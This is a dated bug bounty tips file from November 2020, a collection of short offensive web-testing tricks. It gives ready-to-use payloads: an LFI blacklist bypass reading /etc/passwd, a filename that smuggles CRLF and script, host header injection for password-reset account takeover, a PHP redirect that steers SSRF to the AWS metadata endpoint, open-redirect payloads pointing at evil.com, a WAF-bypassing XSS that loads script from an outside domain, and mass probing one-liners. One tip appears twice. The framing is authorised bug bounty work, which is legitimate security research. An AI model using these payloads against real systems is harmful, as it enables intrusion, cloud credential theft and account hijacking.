# Bug Bounty Tips File -4
📅 06-Nov-2020
## Browser-Based application LFI
`file:///etc/passwd` blacklisted? Use `"view-source:file:///etc/passwd"`
"view-source" is often forgotten by developers in blacklists.
## bypassing file content restrictions:
in some cases you can do a crlf injection via filename
`x.png%22%0d%0a%0d%0a%0d%0a<script>alert(1)</script>`
***this will cause Content-Disposition to throw its content into the file***

📅 10-Nov-2020
## Race Condition
***https://hackerone.com/reports/994051***
## Host Header Injection
It was blocking all the urls except for the websites hosted with the same provider. In this case Fastly. 
```js
host : http://bbc.com
```
**worked**                    
Now attacker can register a domain with Fastly and use HHI to ATO using forgot password ! 

📅 11-Nov-2020
## SSRF Bypass via 303 redirect
*Host the following code in your server and use your server ip to ping at where you feel ssrf is found*
```php
<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>
```
***Note :*** This code is to fetch aws metadata you can edit the location to your target location. For more info **https://medium.com/techfenix/ssrf-server-side-request-forgery-worth-4913-my-highest-bounty-ever-7d733bb368cb** 

📅 12-Nov-2020
## Browser-Based application LFI
`file:///etc/passwd` blacklisted? Use `view-source:file:///etc/passwd`
"view-source" is often forgotten by developers in blacklists.

📅 16-Nov-2020
## Check for open redirect,ssrf with waybackurls
```sh
waybackurls target[.]com | grep ‘http%\|https%'
```
***Note : You can replace the URLs you find with yours and hope for an open redirect,ssrf or something else. You can grep out analytic stuff with grep -v. If your target has something with OAuth with a redirect_uri target/* that's an easy ATO***
## Searching for endpoints, by apks
```sh
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```
## Fuzz all js files from the target
```sh
xargs -P 500 -a domain -I@ sh -c 'nc -w1 -z -v @ 443 2>/dev/null && echo @' | xargs -I@ -P10 sh -c 'gospider -a -s "https://@" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" | sed "s#\] \- #\n#g" | anew'
```
📅 17-Nov-2020
## OPen redirect Bypass payloads
```text
http:http:evil[.]com
http:/evil%252ecom
///www.x.com@evil.com
```
## Recent XSS triple bypass surgery:
```js
DOM XSS via $.append(<PAYLOAD>)
1. WAF: <script> blocked but <script/a> isn’t (lol)
2. All uppercased: Instead of direct JS (ALERT isn’t valid), use <script/src>
3. 20 char limit(!!): Used my 5 char domain <script/src=//ab.cd> 
```
***thanks to [@spaceracoon](https://twitter.com/spaceraccoonsec)***
## Bug bounty cheatsheet
> ***https://github.com/EdOverflow/bugbounty-cheatsheet***
## Blind SQL Injection
> ***https://hackerone.com/reports/1034625***
